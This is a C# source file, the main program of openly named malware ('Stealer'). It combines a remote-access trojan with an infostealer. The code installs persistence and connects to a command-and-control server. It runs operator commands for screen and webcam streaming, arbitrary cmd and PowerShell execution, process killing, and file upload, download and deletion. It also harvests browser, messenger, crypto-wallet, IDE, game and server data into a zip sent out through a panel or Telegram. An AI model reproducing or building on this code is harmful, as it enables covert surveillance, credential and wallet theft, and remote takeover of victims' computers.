using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Stealer.Collectors;
using Stealer.Utils;

namespace Stealer
{
    class Program
    {
        private static string _clientId;
        private static readonly string CrashLog = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "whm_crash.log");

        static void Main(string[] args)
        {
            AppDomain.CurrentDomain.UnhandledException += (s, e) =>
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " UNHANDLED: " + e.ExceptionObject + "\r\n"); } catch { }
            };

            try
            {
                Config.Initialize();
                _clientId = Environment.MachineName + "_" + Environment.UserName;

                try { Persistence.Install(); } catch { }

                C2Client.Connect(_clientId, HandleCommand);
            }
            catch (Exception ex)
            {
                try { File.AppendAllText(CrashLog, DateTime.Now + " MAIN ERR: " + ex + "\r\n"); } catch { }
            }

            while (true) { Thread.Sleep(60000); }
        }

        private static void HandleCommand(string command)
        {
            string cmd = command.Trim();
            string cmdLower = cmd.ToLower();

            if (cmdLower == "steal")
            {
                RunStealer();
            }
            else if (cmdLower == "uninstall")
            {
                try { Persistence.Uninstall(); } catch { }
                Environment.Exit(0);
            }
            else if (cmdLower.StartsWith("rdp_start"))
            {
                int fps = 5;
                int quality = 50;
                StreamMode mode = StreamMode.TileDelta;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4 && int.TryParse(parts[3], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        mode = (StreamMode)modeVal;
                }
                ScreenStream.Start(fps, quality, mode);
            }
            else if (cmdLower.StartsWith("rdp_mode"))
            {
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2 && int.TryParse(parts[1], out int modeVal))
                {
                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
                        ScreenStream.SetMode((StreamMode)modeVal);
                }
            }
            else if (cmdLower == "rdp_stop")
            {
                ScreenStream.Stop();
            }
            else if (cmdLower.StartsWith("camera_start"))
            {
                int fps = 5;
                int quality = 50;
                int camIndex = 0;
                string[] parts = cmd.Split(':');
                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
                if (parts.Length >= 4) int.TryParse(parts[3], out camIndex);
                CameraStream.Start(fps, quality, camIndex);
            }
            else if (cmdLower == "camera_stop")
            {
                CameraStream.Stop();
            }
            else if (cmdLower == "camera_list")
            {
                string jsonList = CameraStream.GetCameraListJson();
                C2Client.SendText("{\"type\":\"camera_list\",\"devices\":" + jsonList + "}");
            }
            else if (cmdLower.StartsWith("exec_cmd:"))
            {
                string payload = cmd.Substring("exec_cmd:".Length);
                RunShellCommand("cmd.exe", "/c " + payload, "cmd_res");
            }
            else if (cmdLower.StartsWith("exec_ps:"))
            {
                string payload = cmd.Substring("exec_ps:".Length);
                RunShellCommand("powershell.exe",
                    "-NoProfile -ExecutionPolicy Bypass -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + payload.Replace("\"", "\\\"") + "\"",
                    "ps_res");
            }
            else if (cmdLower == "tasklist")
            {
                GetTaskList();
            }
            else if (cmdLower.StartsWith("kill:"))
            {
                string pidStr = cmd.Substring("kill:".Length);
                if (int.TryParse(pidStr, out int pid))
                {
                    KillProcess(pid);
                }
            }
            else if (cmdLower.StartsWith("fm_list:"))
            {
                FmListDirectory(cmd.Substring("fm_list:".Length));
            }
            else if (cmdLower.StartsWith("fm_download:"))
            {
                FmDownloadFile(cmd.Substring("fm_download:".Length));
            }
            else if (cmdLower.StartsWith("fm_delete:"))
            {
                FmDelete(cmd.Substring("fm_delete:".Length));
            }
            else if (cmdLower.StartsWith("fm_upload:"))
            {
                string rest = cmd.Substring("fm_upload:".Length);
                int sep = rest.IndexOf('|');
                if (sep > 0)
                    FmUploadFile(rest.Substring(0, sep), rest.Substring(sep + 1));
            }
        }

        private static void RunShellCommand(string filename, string args, string responseType)
        {
            Task.Run(() =>
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = filename,
                        Arguments = args,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        StandardOutputEncoding = System.Text.Encoding.GetEncoding(System.Globalization.CultureInfo.CurrentCulture.TextInfo.OEMCodePage),
                        StandardErrorEncoding = System.Text.Encoding.GetEncoding(System.Globalization.CultureInfo.CurrentCulture.TextInfo.OEMCodePage)
                    };
                    using (var p = System.Diagnostics.Process.Start(psi))
                    {
                        string output = p.StandardOutput.ReadToEnd();
                        string error = p.StandardError.ReadToEnd();
                        p.WaitForExit(10000);
                        string result = string.IsNullOrEmpty(error) ? output : (output + "\r\n[STDERR]\r\n" + error);
                        string escaped = result.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
                        C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"" + escaped + "\"}");
                    }
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"" + responseType + "\",\"output\":\"[ERROR] " + errEsc + "\"}");
                }
            });
        }

        private static void GetTaskList()
        {
            Task.Run(() =>
            {
                try
                {
                    var procs = System.Diagnostics.Process.GetProcesses();
                    var list = new System.Collections.Generic.List<string>();
                    foreach (var p in procs)
                    {
                        try
                        {
                            string pName = p.ProcessName.Replace("\\", "\\\\").Replace("\"", "\\\"");
                            string windowTitle = (p.MainWindowTitle ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "");
                            long mem = 0;
                            try { mem = p.WorkingSet64 / 1024 / 1024; } catch { }
                            list.Add("{\"pid\":" + p.Id + ",\"name\":\"" + pName + "\",\"title\":\"" + windowTitle + "\",\"mem\":" + mem + "}");
                        }
                        catch { }
                    }
                    string json = "[" + string.Join(",", list.ToArray()) + "]";
                    C2Client.SendText("{\"type\":\"tasklist_res\",\"tasks\":" + json + "}");
                }
                catch { }
            });
        }

        private static void KillProcess(int pid)
        {
            Task.Run(() =>
            {
                try
                {
                    var p = System.Diagnostics.Process.GetProcessById(pid);
                    p.Kill();
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":true,\"pid\":" + pid + "}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"kill_res\",\"success\":false,\"pid\":" + pid + ",\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmListDirectory(string path)
        {
            Task.Run(() =>
            {
                try
                {
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    var items = new System.Collections.Generic.List<string>();

                    if (string.IsNullOrEmpty(path))
                    {
                        foreach (var drive in System.IO.DriveInfo.GetDrives())
                        {
                            try
                            {
                                string n = drive.Name.Replace("\\", "\\\\");
                                string label = "";
                                try { label = (drive.VolumeLabel ?? "").Replace("\"", "\\\""); } catch { }
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"drive\",\"size\":0,\"modified\":\"\",\"label\":\"" + label + "\"}");
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        var dir = new System.IO.DirectoryInfo(path);
                        foreach (var d in dir.GetDirectories())
                        {
                            try
                            {
                                string n = d.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                string mod = d.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"dir\",\"size\":0,\"modified\":\"" + mod + "\"}");
                            }
                            catch { }
                        }
                        foreach (var f in dir.GetFiles())
                        {
                            try
                            {
                                string n = f.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                string mod = f.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
                                items.Add("{\"name\":\"" + n + "\",\"type\":\"file\",\"size\":" + f.Length + ",\"modified\":\"" + mod + "\"}");
                            }
                            catch { }
                        }
                    }

                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"items\":[" + string.Join(",", items.ToArray()) + "]}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_list_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\",\"items\":[]}");
                }
            });
        }

        private static void FmDownloadFile(string path)
        {
            Task.Run(() =>
            {
                try
                {
                    var fi = new System.IO.FileInfo(path);
                    if (fi.Length > 52428800)
                    {
                        string pathEsc2 = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                        C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc2 + "\",\"error\":\"File too large (>50MB)\"}");
                        return;
                    }
                    byte[] data = System.IO.File.ReadAllBytes(path);
                    string b64 = Convert.ToBase64String(data);
                    string name = System.IO.Path.GetFileName(path).Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"name\":\"" + name + "\",\"data\":\"" + b64 + "\"}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_download_res\",\"path\":\"" + pathEsc + "\",\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmDelete(string path)
        {
            Task.Run(() =>
            {
                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                try
                {
                    if (System.IO.Directory.Exists(path))
                        System.IO.Directory.Delete(path, true);
                    else
                        System.IO.File.Delete(path);
                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_delete_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void FmUploadFile(string path, string b64data)
        {
            Task.Run(() =>
            {
                string pathEsc = path.Replace("\\", "\\\\").Replace("\"", "\\\"");
                try
                {
                    byte[] data = Convert.FromBase64String(b64data);
                    string dir = System.IO.Path.GetDirectoryName(path);
                    if (!string.IsNullOrEmpty(dir) && !System.IO.Directory.Exists(dir))
                        System.IO.Directory.CreateDirectory(dir);
                    System.IO.File.WriteAllBytes(path, data);
                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":true}");
                }
                catch (Exception ex)
                {
                    string errEsc = ex.Message.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    C2Client.SendText("{\"type\":\"fm_upload_res\",\"path\":\"" + pathEsc + "\",\"success\":false,\"error\":\"" + errEsc + "\"}");
                }
            });
        }

        private static void RunStealer()
        {
            try
            {
                using (var zip = new InMemoryZip())
                {
                    SystemInfoCollector.Collect(zip);
                    ChromiumCollector.Collect(zip);
                    GeckoCollector.Collect(zip);
                    MessengersCollector.Collect(zip);
                    CryptoCollector.Collect(zip);
                    IDECollector.Collect(zip);
                    GamesCollector.Collect(zip);
                    ServersCollector.Collect(zip);

                    if (zip.Count == 0) return;

                    byte[] zipData = zip.ToArray();
                    string fileName = $"Stealer_{Environment.UserName}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip";

                    if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                    {
                        Task.Run(() => PanelSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                    else
                    {
                        Task.Run(() => TelegramSender.SendZipAsync(zipData, fileName)).GetAwaiter().GetResult();
                    }
                }
            }
            catch { }
        }
    }
}
